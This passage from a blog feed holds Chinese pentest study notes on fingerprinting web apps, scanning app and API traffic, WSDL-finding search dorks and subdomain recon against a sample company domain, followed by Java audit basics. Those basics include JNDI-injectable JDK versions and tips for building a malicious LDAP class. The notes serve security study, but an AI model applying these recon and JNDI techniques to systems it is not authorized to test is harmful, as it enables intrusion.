src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/Web%E5%BA%94%E7%94%A8%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF.png" alt="Web应用指纹分析思路" /></p><h3 id="手工"><a class="markdownIt-Anchor" href="#手工"></a> 手工</h3><ol><li><p>查看数据包。</p><ol><li>查看头/源码，头里面可能会有特征值<ul><li><strong>http头</strong>。查看http响应报头的X-Powered-By字段来识别，可以通过netcat来识别，使用netcat 127.0.0.1 80对127.0.0.1主机的80端口web服务器框架进行识别。</li><li><strong>Cookies</strong>。一些框架有固定的Cookies名称，这些名称一般情况都不会更改，例如zope3、cakephp、kohanasesson、laravel_session。</li><li><strong>Html源代码</strong>。html源代码中包含注释、js、css等信息，通过访问这些信息来判断和确认cms系统框架。在源代码中常常会包含powered by、bulit upon、running等特征。</li></ul></li><li>查看请求地址URL，请求地址目录有特征值<ol><li>wp-content那就是wordpress的</li><li>特殊文件和文件夹</li></ol></li></ol></li><li><p>查看特殊文件（计算md5）</p><ol><li>robots.txt文件（例如dedecms的）</li><li>favicon.ico、css、logo.ico、js等文件的md5 比对网站类型，通过收集CMS公开代码中的独有文件，这些文件一般轻易不会更改，通过爬虫对这些文件进行抓取并比对md5值，如果一样，则认为该系统匹配</li></ol></li><li><p>查看端口：对于端口服务类，详细见下文</p></li></ol><h3 id="工具"><a class="markdownIt-Anchor" href="#工具"></a> 工具</h3><ol><li>whatweb</li><li>wapplyze</li><li>whatruns</li></ol><p>参考：<a href="https://blog.51cto.com/simeon/2115190">https://blog.51cto.com/simeon/2115190</a></p><h2 id="整一个实战流程"><a class="markdownIt-Anchor" href="#整一个实战流程"></a> 整一个实战流程</h2><ol><li>首先识别一下这个网站是什么cms【即上面所说的】<ol><li>看到了robots.txt，那么就直接往whatweb一搜就好，知道是什么cms之后就去查一下版本</li></ol></li><li>知道CMS信息就去查历史漏洞，好像没有可以用的历史漏洞，那就看看<strong>后台地址</strong>是啥，看能不能爆破啥的<ol><li>但是这个后台地址已经改掉了</li></ol></li><li>就去查端口，看有什么应用，对应的漏洞<ol><li>发现888、8888端口，那应该是宝塔waf应用，所以就去看看这个漏洞是啥</li><li>有一个漏洞</li></ol></li><li>啥都没了，那就看看信息/代码泄露，去查看有什么配置信息，可以去看数据库有什么密码之类的<ol><li>看到密码，直接登录，OK</li></ol></li></ol><h1 id="app应用漏洞发现"><a class="markdownIt-Anchor" href="#app应用漏洞发现"></a> APP应用漏洞发现</h1><p>反编译提取 URL 或抓包获取 URL，进行 WEB 应用测试，如不存在或走其他协议的情况下，需采用网络接口抓包进行数据获取，转至其他协议安全测试！</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/APP%E5%BA%94%E7%94%A8.png" alt="APP应用" /></p><ol><li><strong>APP-&gt;WEB APP-&gt;其他 APP-&gt;逆向</strong></li><li><strong>WEB 抓包，其他协议抓包演示及说明</strong></li><li><strong>未逆向层面进行抓包区分各协议测试</strong></li><li><strong>逆向层面进行提取 APK 代码层面数据</strong></li><li>参考： <a href="https://www.cnblogs.com/L0ading/p/12388928.html">https://www.cnblogs.com/L0ading/p/12388928.html</a></li></ol><blockquote><p>所以渗透主要是：对URL进行抓取，对URL进行协议分类，然后分别进行攻击。可以使用web类攻击，也可以使用其他。</p></blockquote><h2 id="url提取"><a class="markdownIt-Anchor" href="#url提取"></a> URL提取</h2><h3 id="burp"><a class="markdownIt-Anchor" href="#burp"></a> Burp</h3><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230608214941671.png" alt="image-20230608214941671" /></p><p>然后搜索一下（showall）关键字，像id之类的。</p><p>需要注意的是：</p><blockquote><p>由于这些app的链接都能在 <strong>电脑</strong> 上访问，但是访问之后的**请求数据包不一样！**所以，你需要在测试的时候先抓一个安卓数据包，然后在测试的时候（例如xray）改一下http头部。</p><p>如果你不用burp，可以在手机端安装：<strong>抓包精灵</strong>。跟burp的抓包功能差不多。但是功能不好用，不是什么数据都抓。</p></blockquote><h3 id="apk-analyser"><a class="markdownIt-Anchor" href="#apk-analyser"></a> Apk Analyser</h3><p>直接把APK放进去扫就行。</p><h3 id="xrayawvsburp联动扫描"><a class="markdownIt-Anchor" href="#xrayawvsburp联动扫描"></a> xray/awvs+burp联动扫描</h3><p>设置如下：</p><ol><li><p>手机端的wifi模块高级设置，设置代理转发到192.168.???.???的端口8888</p></li><li><p>burp设置代理捕获端口8888，然后设置转发端口6666</p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230609093308523.png" alt="image-20230609093308523" style="zoom:80%;" /></li><li><p>xray设置代理端口为6666，开启webscan：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xray.exe webscan --listen 127.0.0.1:6666</span><br></pre></td></tr></table></figure></li><li><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230609093858920.png" alt="image-20230609093858920" style="zoom:67%;" /></li></ol><h2 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h2><p>上工具/自己按照web的方法使用</p><h1 id="api接口服务漏洞发现"><a class="markdownIt-Anchor" href="#api接口服务漏洞发现"></a> API接口服务漏洞发现</h1><p>API接口渗透测试是通过用渗透测试的方法测试系统组件间接口的一种测试。<strong>接口渗透测试主要用于检测外部系统与系统之间以及内部各个子系统之间的交互点</strong>。测试的重点是要<strong>检查数据的交换，传递和控制管理过程，以及系统间的相互逻辑依赖关系等</strong>。</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/20210515173719.png" alt="img" /></p><p>参考：</p><ol><li><a href="https://blog.csdn.net/dzqxwzoe/article/details/129221428">https://blog.csdn.net/dzqxwzoe/article/details/129221428</a></li><li><a href="https://xz.aliyun.com/t/2412">https://xz.aliyun.com/t/2412</a></li><li><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/03.%E6%80%9D%E8%B7%AF%E6%8A%80%E5%B7%A7/03.api%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95#%E6%8E%A5%E5%8F%A3%E6%96%87%E6%A1%A3%E7%9A%84%E4%BD%9C%E7%94%A8">https://blog.gm7.org/个人知识库/01.渗透测试/03.思路技巧/03.api接口测试#接口文档的作用</a></li></ol><h2 id="漏洞挖掘关注点"><a class="markdownIt-Anchor" href="#漏洞挖掘关注点"></a> 漏洞挖掘关注点</h2><h3 id="信息搜集"><a class="markdownIt-Anchor" href="#信息搜集"></a> 信息搜集</h3><p>在 API 渗透中，<strong>除了常规的域名、端口、服务器 banner 之类的信息外</strong>，API 本身所特有的信息在信息收集时需要关注。举例如下。</p><ul><li><strong>API 是否存在接口定义规范描述文件</strong>？【判断接口类型】如果存在，遵循的规范是什么？SOAP、Open API 2.0、Open API 3.0 还是 Graph QL？</li></ul><ul><li>API 是依赖什么语言实现的？Java、.NET、PHP、Python、Go 还是其他语言？【构造payload需要用到】</li><li>API 运行所依赖的组件是什么版本，是否存在已知漏洞？</li><li>互联网上是否存在其泄露的 API Key 或证书？</li><li>API 是否存在多个版本？多个接入端？</li></ul><p>还有就是，需要提供两个信息：【最重要】</p><ol><li><strong>API地址</strong></li><li><strong>接口文档</strong></li><li><strong>其他的按需要求客户提供，比如接口示例、认证token、sign校验算法等</strong></li></ol><h3 id="手工测试"><a class="markdownIt-Anchor" href="#手工测试"></a> 手工测试</h3><p>在 API 渗透测试中，手工挖掘往往占有较大的比重。当采用手工挖掘时，以下事项是需要重点关注的。</p><ul><li><p><strong>认证和授权</strong>：对于 API 的认证鉴权机制，设计人员和研发人员往往认识不足，有的 API 调用甚至缺少认证与授权机制。比如令牌、HTTP 方法（GET，POST，PUT 和 DELETE 等）在进入服务器之前是否都经过了验证，OAuth 协议使用的正确性，无认证和授权的 API 是否可以任意调用。</p></li><li><p><strong>输入验证</strong>：和其他类型的应用程序一样，对于输入的不可信是应用程序安全的基础，但研发人员常常因疏忽导致对输入缺少有效的验证。比如 XML 实体注入类型的攻击、不同的响应类型 application/json 与 application/xml。</p></li><li><p><strong>数据编码</strong>：包含 JSON 格式的数据，容易导致反序列化漏洞或远程代码执行。</p></li><li><p><strong>API 版本和影子 API</strong>：同一个 API 的不同版本或未在 API 规范文件中描述的 API，更容易发现安全漏洞。</p></li></ul><h2 id="测试接口类型"><a class="markdownIt-Anchor" href="#测试接口类型"></a> 测试接口类型：</h2><ol><li><strong>Webservice接口</strong>：走soap协议，请求报文和返回报文都是<strong>xml</strong>格式</li><li><strong>HTTP API接口</strong>（常规客户）：走HTTP协议，通过路径来区分调用的方法，以<strong>RESTful</strong>风格为主，请求报文入参有多种形式，返回报文一般为<strong>json</strong>串，最常见的是get和post方法</li></ol><p>接口测试分为web service和API接口测试,WebSocket接口等测试。可以使用该网址进行发包啥的：<a href="https://v7.apipost.cn/apis#/apis/run">https://v7.apipost.cn/apis#/apis/run</a></p><h3 id="webservice"><a class="markdownIt-Anchor" href="#webservice"></a> WebService</h3><p>Web Service服务也是一些包装过的接口而已，针对Web Service服务的渗透测试和对常规API渗透测试是一样的、只是，可以使用安全工具来辅助进行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WebScarap</span><br><span class="line">SoapUI</span><br><span class="line">WCFStorm</span><br><span class="line">SOA Cleaner</span><br><span class="line">WSDigger</span><br><span class="line">wsScanner</span><br><span class="line">Wfuzz</span><br><span class="line">RESTClient</span><br><span class="line">BurpSuite</span><br><span class="line">WS-Attacker</span><br><span class="line">ZAP</span><br><span class="line">Metasploit</span><br><span class="line">WSDL Analyze</span><br></pre></td></tr></table></figure><p>SoapUI NG Pro作为Web Service的测试工具，Burp作为代理、监听SoapUI NG Pro用自己构造的payload报文打Web Service的流量报文，其中可以篡改对应的报文参数实现渗透测试。</p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230612134657810.png" alt="image-20230612134657810" style="zoom: 67%;" /><p>可以查找：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">inurl:jws?wsdl</span><br><span class="line">inurl:asmx?wsdl</span><br><span class="line">inurl:aspx?wsdl</span><br><span class="line">inurl:ascx?wsdl</span><br><span class="line">inurl:ashx?wsdl</span><br><span class="line">inurl:dll?wsdl</span><br><span class="line">inurl:exe?wsdl</span><br><span class="line">inurl:php?wsdl</span><br><span class="line">inurl:pl?wsdl</span><br><span class="line">inurl:?wsdl</span><br><span class="line">filetype:jws</span><br><span class="line">filetype:asmx</span><br><span class="line">filetype:ascx</span><br><span class="line">filetype:aspx</span><br><span class="line">filetype:ashx</span><br><span class="line">filetype:dll</span><br><span class="line">filetype:exe</span><br><span class="line">filetype:php</span><br><span class="line">filetype:pl</span><br><span class="line">filetype:wsdl</span><br></pre></td></tr></table></figure><h2 id="测试手法"><a class="markdownIt-Anchor" href="#测试手法"></a> 测试手法</h2><p>在得到api之后，有这个思路可以参考挖掘：</p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230612143924759.png" alt="image-20230612143924759" style="zoom: 67%;" /><ol><li>观察接口命名，采用驼峰命名法，是否存在其他不在接口文档的类似的测试接口，比如<code>getUserInfos</code>、<code>getUserInfoByUid</code>等</li><li>这个地方虽然参数是<code>phone</code>，那会不会后端模糊查询输入用户名也可以查询呢</li><li>查询任意用户信息的接口，应该存在鉴权机制<ol><li>未授权访问</li><li>针对普通用户，每个人只能查询自己的信息</li></ol></li><li>手机号进入后端查询用户的信息，肯定会进行数据库查询<ol><li>是否可以模糊查询，比如<code>1388888%</code></li><li>是否存在SQL注入</li><li>参数置空、过长或者输入特殊字符，会不会导致数据库报错抛出异常，获取一些敏感信息</li></ol></li></ol><h1 id="补充知识点信息的最大化"><a class="markdownIt-Anchor" href="#补充知识点信息的最大化"></a> 补充知识点（信息的最大化）</h1><p>前置知识：使用IP访问和使用域名访问有什么区别？</p><blockquote><p>假设：有域名abc.com对应域名123.123.123.123，其建立的文件夹目录为：<code>d:\www\j3fffff\</code></p><ul><li>使用域名访问则会访问目录：<code>d:\www\j3fffff\</code></li><li>使用IP访问则会访问目录：<code>d:\www\</code></li></ul><p>所以如果有文件：<code>d:\www\old.zip</code>，那么使用IP地址可以访问，而使用域名就不行。</p></blockquote><h2 id="ip-端口-web"><a class="markdownIt-Anchor" href="#ip-端口-web"></a> IP  端口 web</h2><p>在如BurpSuite这种代理工具中设定的过滤规则来筛选Web Service请求。比如“.dll?wsdl”、“.ashx?wsdl”、“.exe?wsdl”、“.php?wsdl”等</p><h2 id="域名-web"><a class="markdownIt-Anchor" href="#域名-web"></a> 域名 web</h2><p>子域名搜集，搜集的站点越多，目标越多，机会越多，可能越多！</p><p>子域名搜集不仅仅局限于（子域名挖掘机）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www.jmlsd.com</span><br><span class="line">bbs.jmlsd.com</span><br><span class="line">old.jmlsd.com</span><br></pre></td></tr></table></figure><p>还可以 <strong>换后缀</strong> 看他以前有没有注册过这些域名（可以去<a href="https://www.west.cn/services/domain/%E7%9C%8B%E7%9C%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E8%A2%AB%E6%B3%A8%E5%86%8C%EF%BC%89%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%EF%BC%8C%E9%82%A3%E4%B9%88%E5%8F%AF%E8%83%BD%E6%98%AF%E5%90%8C%E4%B8%80%E5%AE%B6%E7%9A%84%EF%BC%8C**%E5%B9%B6%E4%B8%94%E6%8C%82%E8%BD%BD%E4%BA%86%E8%80%81%E7%9A%84%E7%B3%BB%E7%BB%9F%E6%88%96%E8%80%85%E5%85%B6%E4%BB%96%E4%B8%9A%E5%8A%A1**%EF%BC%88%E5%8F%AF%E8%83%BD%E6%98%AF%E6%9C%89%E6%BC%8F%E6%B4%9E%E7%9A%84%EF%BC%89%EF%BC%9A">https://www.west.cn/services/domain/看看有没有被注册），如果有，那么可能是同一家的，**并且挂载了老的系统或者其他业务**（可能是有漏洞的）：</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">www.jmlsd.com.cn</span><br><span class="line">www.jmlsd.cn</span><br><span class="line">www.jmlsd.net</span><br><span class="line">www.jmlsd.org</span><br></pre></td></tr></table></figure><p><strong>还可以通过注册人反查他注册了什么公司</strong></p><p>还可以通过特有信息，例如网站上写着：键美乐 ，那就查这个，可能会有其他域名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.jmljy.com.cn</span><br></pre></td></tr></table></figure><p>这个跟上面的是不一样的，他是“家园”，而不是“时代”。但是是一家公司的！</p><p><img src="/images/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%81WEB%E5%BA%94%E7%94%A8%E3%80%81APP%E5%BA%94%E7%94%A8%E4%B8%8EAPI%E6%8E%A5%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/image-20230609152636845.png" alt="image-20230609152636845" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;为什么要做漏洞发现？如果知道漏洞，就不用进行很多攻击，直接利用exp&lt;/li&gt;
&lt;li&gt;漏洞类型&amp;amp;危害条件？知道危害条件就可</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="漏洞发现" scheme="https://j3f5.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>JAVA常见漏洞与代码审计基础</title>
    <link href="https://j3f5.github.io/articles/2023/06/08/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
    <id>https://j3f5.github.io/articles/2023/06/08/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</id>
    <published>2023-06-08T05:50:18.000Z</published>
    <updated>2023-07-07T05:50:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><p>这一篇很长，鉴于之前已经分享过的漏洞内容，这里做一个Java漏洞的合集，里面的很多漏洞均已在之前的文章分析过，这里着重讲发现漏洞的trick，如何去操作，原理是怎么样的。进而，我们可以知道如何去审计一个系统。</p><p>这里已经默认安装了很多工具，不再一一讲。</p><p>此篇章将融合webgoat的代码审计、安全狗《JAVA代码审计（入门篇）》以及奇安信《网络安全：Java代码审计实战》整理而出。</p><h1 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h1><h2 id="java基础"><a class="markdownIt-Anchor" href="#java基础"></a> Java基础</h2><h3 id="反射机制"><a class="markdownIt-Anchor" href="#反射机制"></a> 反射机制</h3><h2 id="java-ee"><a class="markdownIt-Anchor" href="#java-ee"></a> Java EE</h2><h3 id="体系结构域分层模型"><a class="markdownIt-Anchor" href="#体系结构域分层模型"></a> 体系结构域分层模型</h3><p><img src="/images/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/image-20230707103547244.png" alt="image-20230707103547244" /></p><p><img src="/images/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/image-20230707104845087.png" alt="image-20230707104845087" /></p><h3 id="servlet"><a class="markdownIt-Anchor" href="#servlet"></a> Servlet</h3><h4 id="什么是servlet"><a class="markdownIt-Anchor" href="#什么是servlet"></a> 什么是Servlet</h4><p>Servlet 其实是<strong>在 Java Web 容器中运行的小程序</strong>。用户通常使用 Servlet 来处理一些较为复杂的服务器端的<strong>业务逻辑</strong>。Servlet 是 Java EE 的核心，也是所有MVC 框架实现的根本，从图上看，他是服务器上的数据库或者应用程序之间的中间层。</p><img src="/images/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/image-20200601171228009.png" alt="image-20200601171228009" style="zoom: 33%;" /><h4 id="servlet的流程"><a class="markdownIt-Anchor" href="#servlet的流程"></a> Servlet的流程</h4><ol><li>客户端发起一个http请求</li><li>Servlet容器接收到请求，读取客户端（浏览器）发送的数据，并根据请求信息调用相应的Servlet。</li><li>Servlet来处理具体的业务逻辑，也就是我们写的Servlet中的代码。</li><li>Servlet处理数据并生成结果，返回给Servlet容器。</li><li>Servlet容器将最后结果返回给客户端</li></ol><p>步骤2中的调用流程为：当接收到user时，通过mapping 找到name，然后通过name来映射到对应class来执行逻辑。</p><img src="/images/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/image-20230401212606805.png" alt="image-20230401212606805" style="zoom:50%;" /><h4 id="servlet的生命周期"><a class="markdownIt-Anchor" href="#servlet的生命周期"></a> Servlet的生命周期</h4><ul><li>Servlet 通过调用 init () 方法初始化Servlet对象，init方法只会被调用一次。</li><li>Servlet 调用 service() 方法来处理客户端的请求，service()会调用相应的doGet或者doPost等方法来处理。</li><li>Servlet 通过调用 destroy() 方法终止（结束），这个方法也只会被执行一次。</li></ul><h4 id="filterservlet特性"><a class="markdownIt-Anchor" href="#filterservlet特性"></a> Filter（Servlet特性）</h4><p><strong>Filter是什么，有什么用</strong></p><p>filter 被称为过滤器，通过Filter 技术，能够实现对所有Web 资源的管理，如实现</p><ol><li>权限访问控制</li><li>过滤敏感词汇</li><li>压缩响应信息</li></ol><p>等一些高级功能。</p><p><strong>Filter与Servlet的联系</strong></p><p>Web 服务器会在每次调用Web 资源的service() 方法之前先调用doFilter 方法。</p><img src="/images/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/image-20230401213107463.png" alt="image-20230401213107463" style="zoom:50%;" /><p>其周期也是跟servlet一样。</p><p><strong>JSP</strong></p><p>其实这个也可以当作一个servlet，它的生命周期是：当用户请求数据的时候，交给web处理后，产生，然后返回html立刻结束，web传递html给用户。它可以执行java代码等等。</p><h3 id="jndi"><a class="markdownIt-Anchor" href="#jndi"></a> JNDI</h3><p>包括客户端组件、web组件（servlet）、业务组件（消息会话等）等等</p><h3 id="服务"><a class="markdownIt-Anchor" href="#服务"></a> 服务</h3><h4 id="jdni"><a class="markdownIt-Anchor" href="#jdni"></a> JDNI</h4><p>JNDI（the java Naming and Directory Interface，java命名和目录接口）是一组在java应用中访问命名和目录服务器的API，命令服务将名称和对象联系起来，使得我们可以用名称访问对象。</p><blockquote><p>这个接口就跟RMI的一个服务一样，举例：一个实际生产环境中，一般不会写死链接数据库的地址，因为这个数据库会因为各种业务的调配而改变，所以有一个JNDI接口（文件），他上面有各种服务以及其端口的记录，当业务更变，那么直接更变这个文件即可，其他程序直接调用这个文件更改过的地址/端口就可以了。</p></blockquote><p>这些命名/目录服务提供者。</p><ol><li><strong>RMI</strong>（JAVA远程方法调用）</li><li><strong>LDAP</strong>（轻量级目录访问协议）</li><li>CORBA（公共对象请求代理体系）</li><li><strong>DNS</strong>（域名服务）一般用它来探测是否存在JNDI注入，理由有二：快速且轻量+匿名（使用dnslog能够隐匿自己的IP信息，但是抓包你不还是没用？）</li></ol><p>可利用版本：</p><table><thead><tr><th></th><th>JDK6</th><th>JDK7</th><th>JDK8</th><th>JDK11</th></tr></thead><tbody><tr><td>RMI</td><td>6u132以下</td><td>7u122以下</td><td>8u113以下</td><td>NONE</td></tr><tr><td>LDAP</td><td>6u211以下</td><td>7u201以下</td><td>8u191以下</td><td>11.0.1以下</td></tr></tbody></table><blockquote><p>代码执行顺序：</p><ul><li>可以看到，内存马什么的一般都会将代码放到static关键字中</li><li>顺序，加载类后直接执行 static里面的代码内容【最优先】，然后执行static关键字内的函数代码，然后执行构造函数</li></ul><p>ldap构造恶意类需要注意的点：</p><ol><li>类名要与ldap服务的转发名一致</li><li>代码写在static中</li><li>包名实际上是不需要的（也就是package）以为他将在你这运行，不可能加载到服务器里的类的。</li><li>注意编译当前类的java版本需要与服务器中的一样。</li></ol></blockquote><h4 id="jdbc"><a class="markdownIt-Anchor" href="#jdbc"></a> JDBC</h4><blockquote><p>JDBC（Java DataBase Connectivity）是Java和数据库之间的一个桥梁，是一个 规范 而不是一个实现，能够执行SQL语句。它由一组用Java语言编写的类和接口组成。各种不同类型的数据库都有相应的实现。</p></blockquote><h5 id="cve-2022-21724引申jdbc漏洞"><a class="markdownIt-Anchor" href="#cve-2022-21724引申jdbc漏洞"></a> CVE-2022-21724引申jdbc漏洞</h5><ul><li>MySQL JDBC 客户端反序列化漏洞<a href="https://xz.aliyun.com/t/8159">参考文章</a></li><li>简单的说：在JDBC连接MySQL的过程中，执行了SHOW SESSION STATUS语句。而如果我们控制返回的结果是一个恶意的对象，jdbc就会去执行readobject方法反序列化，从而有入口点，在利用cc链，完美rce</li></ul><h5 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> sql注入</h5><p>JDBC 有两种方法执行SQL 语句，分别为<strong>PrepareStatement</strong> 和<strong>Statement</strong>。两个方法的区别在于<strong>PrepareStatement</strong> 会对SQL 语句进行<strong>预编译</strong>，而<strong>Statement</strong> 方法在<strong>每次执行时都需要编译</strong>，<strong>会增大系统开销</strong>。</p><p>理论上PrepareStatement 的效率和安全性会比Statement 要好，但并不意味着使用PrepareStatement 就绝对安全，不会产生SQL注入。正确地使用PrepareStatement 可以有效避免SQL 注入的产生，使用 <strong>?</strong> 作为占位符时，填入对应字段的值会进行严格的类型检查。将前面的“<strong>拼接构造SQL 语句</strong>”改为如下“<strong>使用占位符构造SQL 语句</strong>”的代码片段，即可有效避免SQL 注入的产生。</p><h3 id="mvc"><a class="markdownIt-Anchor" href="#mvc"></a> MVC</h3><p>老三层说的就是上面，在java中映射到的就是</p><p>套一下上面的MVC架构流程的公式</p><p>用户发起createOrder http请求 =&gt; OrderController下面有个createOrder方法 =&gt; 调用Service里面的createOrder方法 =&gt; (调用外部服务获取相关信息或校验用户和商品信息) =&gt; 调用数据库</p><ul><li>采用三层架构或MVC搭建程序最主要的区别：MVC<strong>没有把业务的逻辑访问看成两个层</strong>。</li></ul><p><img src="/images/JAVA%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/resize,m_fixed,w_1184.jpg" alt="代码分层设计，三层架构Controller、Service和Dao的区别与联系_数据_02" /></p><h2 id="maven相关基础知识"><a class="markdownIt-Anchor" href="#maven相关基础知识"></a> Maven相关基础知识</h2><h2 id="springboot相关基础知识"><a class="markdownIt-Anchor" href="#springboot相关基础知识"></a> SpringBoot相关基础知识</h2><h1 id="sql"><a class="markdownIt-Anchor" href="#sql"></a> SQL</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
